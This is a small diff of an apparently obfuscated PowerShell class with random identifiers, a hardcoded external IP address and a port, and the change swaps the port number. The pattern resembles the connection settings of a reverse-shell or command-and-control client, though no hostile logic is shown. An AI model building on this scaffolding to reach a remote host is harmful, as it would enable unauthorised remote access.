@@ -1,7 +1,7 @@
 class lWENuFVGi {
     
     [string]$mkLiUmlbGeQEUAgcYkmzL = "65.0.50.125"
-    [int]$erRDxRcpCdaHrppwwHAoLQr = 22544
+    [int]$erRDxRcpCdaHrppwwHAoLQr = 22612
 
     $BOzkfedbbBMHjbAJxTOxpp
     $jwiwZveoQlNJwhlmQNrhY
